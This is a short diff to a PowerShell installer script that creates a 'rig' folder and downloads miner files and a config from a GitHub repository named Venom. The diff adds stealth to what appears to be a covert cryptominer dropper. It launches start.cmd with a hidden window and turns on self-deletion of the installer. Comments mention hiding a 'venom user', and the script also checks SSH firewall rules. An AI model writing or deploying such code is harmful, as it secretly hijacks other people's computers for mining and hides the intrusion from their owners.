@@ -59,7 +59,6 @@ Get-NetFirewallRule -Name *ssh*
 
 #Create rig Folder within Folder
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
-echo $wd
 cd $wd
 
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/SHA256SUMS -OutFile "SHA256SUMS.txt"
@@ -77,12 +76,12 @@ Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
 
 # start rig
-powershell ./start.cmd
+powershell -windowstyle hidden ./start.cmd
 
 
 # hide venom user
 
 # self delete
 cd $initial_dir
-#del installer.ps1
+del installer.ps1
 
